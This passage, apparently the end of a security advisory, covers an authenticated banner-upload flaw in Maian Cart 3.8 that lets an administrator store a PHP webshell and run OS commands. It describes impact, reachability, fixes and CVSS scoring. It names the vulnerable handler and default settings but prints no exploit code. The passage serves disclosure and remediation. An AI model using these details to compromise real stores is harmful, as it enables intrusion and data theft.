- OS command execution as the web server process — `uid=0(root)` in the laboratory, typically www-data or apache in production — with full read/write access to everything that identity can reach: store source code, application configuration (including the database credentials the application itself reads), uploaded order attachments and the surrounding file system.
- Database access with the application's privileges: the MySQL backend holds the store's orders, customer records and settings; the webshell reaches it directly using the same configuration the application uses. This is a direct consequence of verified code execution in the application's own context rather than a separately exercised step.
- Persistence: the stored `img_<id>.php` outlives the administrator session; the banners-table bookkeeping and the handler's own overwrite behavior keep the file in place across restarts, and nothing in the product scans for or removes it.
- Pivot: the web server becomes a foothold into whatever network segments the store host can reach — database hosts, internal services and, in shared hosting layouts, neighboring tenants.

The privilege-separation observation sharpens the impact: the product's own shipped deny rules for three sensitive directories demonstrate that execution denial is a control the vendor understands and applies elsewhere. The banners tree lacks that control, and the omission is what converts an authenticated file-write primitive into OS-level code execution.

### Reachability: who can reach it in practice

From the outside, exploitation requires administrator credentials. Two realistic holder populations exist. First, a malicious or compromised insider with store-administration rights: for that actor the chain escalates a content-management role into OS-level control, and the upload is audit-invisible — it appears in the interface as an ordinary banner addition. Second, an external attacker who obtains credentials through reuse, guessing or the companion weakness that installer-provisioned credentials persist without forced rotation (section 3); in that deployment state the conditional PR:N reading of section 12 applies. The primary classification of this advisory remains post-authentication in both readings of the threat model.

## 11. Fix Recommendations

Ordered by proximity to the root cause:

1. Enforce an extension allow-list at the sink — the root-cause fix. In `addBanners()`, and symmetrically in `updateBanners()` and any other handler that moves user files, reject any upload whose `strrchr(strtolower($name),'.')` is not in an image allow-list. The product already contains exactly this control in class.products.php (`$imgAllow = array('.jpg','.jpeg','.png','.gif')`, applied at class.products.php:1213 and :1907); reuse it so the two handlers cannot drift apart again.
2. Validate content, not just the name. Before persisting, run `getimagesize()`/`finfo` MIME validation on the uploaded bytes so polyglot files carrying PHP code with an image extension are rejected. Extension checks alone are bypassable in combination with server misconfiguration; content validation is the second leg.
3. Discard the client-supplied extension entirely. After content validation succeeds, construct the stored name server-side with a fixed extension derived from the validated image type (for example `BANNER_PREFIX . <id> . '.jpg'`), so no part of the client filename contributes to the stored name.
4. Make the storage location non-executable — defense in depth mirroring the product's own pattern. Either move `BANNER_FOLDER` outside the document root and serve banners through a read-through script, or ship a deny configuration for `content/_theme_default/images/banners/`: an `.htaccess` (`php_flag engine off` or `Deny from all`) matching what the product already ships for `admin/import/`, plus documented nginx-equivalent guidance (a `location` block that clears the PHP fastcgi pass), since `.htaccess` protects only Apache deployments.
5. Unify upload sanitization in one shared helper. The recorded inconsistency — `addBanners` (no check), `addAdditionalProductPictures` (allow-list), `uploadImportFile` (different validation), `uploadWebLogo` (no check, dead code) — shows per-handler validation is not maintainable. Route every `move_uploaded_file` call site through a single validator so a new handler cannot forget the check.
6. Fix the companion credential weakness. Force rotation of the installer-provisioned administrator credential at first login — products that ship a first-login password-change enforcement flag show this is an accepted pattern — and promote the `access.php` hardening note (the credential file's own comment suggests deleting it) from an optional comment into an enforced, documented step.
7. Remove or gate the dead code. `uploadWebLogo()` (class.system.php:956) has no call sites; delete it, or give it the same shared validator so a future feature addition cannot make it reachable while still unvalidated.

## 12. CWE and CVSS

### CWE and CVSS classification

- CWE-434 (Unrestricted Upload of File with Dangerous Type) — the primary classification: a multipart upload reaches `move_uploaded_file` with an attacker-chosen extension and attacker-chosen content, and no type restriction exists anywhere along the path.
- CWE-78 (OS Command execution) — the realized impact: the stored webshell invokes `shell_exec` on a request parameter, so the upload defect yields command execution on the host. The product itself never passes user input to a command API directly; CWE-78 describes the outcome enabled by CWE-434, matching the record's CWE-434 → CWE-78 chain.
- CWE-269 (Improper Privilege Management) — the execution privilege context: the laboratory PHP process ran as root (`uid=0` observed), while production identity is whatever user the web server runs as. The absence of privilege separation between the web role and the operating system aggravates impact but is not the root cause.
- CWE-798-class companion note — persistent installer-provisioned credentials without a rotation gate, described in section 3. It is reported as a separate observation and does not reclassify the primary finding as unauthenticated.

### CWE and CVSS independence

This analysis is original research on Maian Cart 3.8: the code audit, the sink/source mapping, the exhaust review of the unauthenticated surface, the dynamic verification (three independent runs, including a from-scratch re-analysis that shipped a second shell through the same handler) and the adversarial refutation review were all performed within this research programme. No CVE identifier is associated with this finding. The record's negative result is a single keyword search of the national vulnerability database performed at research time that identified no entry for this handler; neither the search terms nor their results were retained, so the correct scope is "this search found nothing", not "no prior entry exists". The vendor's wider product family does carry public vulnerability history, and this advisory deliberately does not convert an unretained keyword search into an open-ended absence claim. There is consequently no prior-art identifier to cite or distinguish; the sibling-product pattern note in section 1 likewise carries no identifier. Nothing in this advisory repackages public vulnerability data.

### CWE and CVSS score

Primary score — the only classification this advisory claims:

- Vector: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 (High), CVSS version 3.1.
- AV:N — the chain runs entirely over HTTP(S) against any network-exposed store.
- AC:L — deterministic and repeatable: one multipart POST plus one GET, under shipped defaults (`RENAME_BANNERS=1`, `BANNER_PREFIX='img_'`, `THEME_FOLDER='content/_theme_default'`), with no race window, memory-safety precondition or exotic configuration.
- PR:H — the sink sits behind the webmaster gate (`mc_isWebmasterLoggedIn` at system-load.php:79 for cmd=settings). Section 3 documents the exhaustive exclusion of unauthenticated candidates: `ajax.php` exposes no RCE sink, cookie forgery is blocked by the per-installation `DB_NAME` inside `mc_encrypt(SECRET_KEY . DB_NAME)`, no POP gadget exists, and the login path is not injectable. A lower-privileged reading with PR:L computes 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) but no role below webmaster reaches the settings module in the recorded gate model, so PR:L is not adopted.
- UI:N — no victim interaction is needed once credentials are held; the `cs_rf` CSRF token gates cross-site forgery of an admin's browser, not the authenticated attacker's own requests — the exploit retrieves the token from the login page itself.
- S:U — the vulnerable component and the impacted component are the same security authority: the web application and the operating-system process hosting it. No separate trust boundary (hypervisor, distinct management plane, client-side authority) is crossed. The scope-changed variant computes 9.1 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) and is not adopted.
- C:H/I:H/A:H — arbitrary OS command execution as the web server user grants full read, full write and full denial-of-service capability over the store and its host within that identity's privileges.

Conditional reading — published for triage completeness, explicitly conditional:

- Solely on the strength of the companion observation (installer-provisioned credentials are never forced to rotate), a deployment that retains unchanged, known or guessable administrator credentials reduces the admin gate to a formality. In that deployment state the effective vector becomes AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical). **This `PR:N` reading is this advisory's own construction.** The research record never writes a `PR:N` vector and never states a 9.8 figure: it scores the finding under AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 only, appending the remark that practical exploitability is higher where provisioned credentials are not forced to rotate, and its separate conclusion on the unauthenticated objective is that the objective was not reached. The reading is nevertheless defensible on the evidence, and it is published here because every element of it is fenced as deployment state rather than product state: this reading is conditional on a deployment property, not a product property: the product ships no fixed default credential, and the research verified no installation whose credentials were guessable. It does not change the primary classification, which stays PR:H throughout this advisory.

Arithmetic check with the project's CVSS 3.1 calculator (round-up to the tenth):

Arithmetic check under the CVSS 3.1 base metric algorithm (base score rounded up to the nearest tenth), each figure recomputed from its own vector:

```
primary     AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H -> 7.2   (Exploitability 8.22*0.85*0.77*0.27*0.85 = 1.235; Impact 6.42*ISS = 5.873; 7.108 -> 7.2)
PR:L anchor AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H -> 8.8   (PR:L weight under S:U is 0.62)
S:C variant AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H -> 9.1   (PR:H weight under S:C is 0.50; Scope-Changed impact term)
conditional AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H -> 9.8   (PR:N weight 0.85)
```

---

*Research and write-up by the 0day Rubbish team. Technical detail published with a working proof of concept.*

- Advisory: https://0day-rubbish.com/blog/maian-cart-addbanners-upload-extension-webshell-rce
- Repository: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com
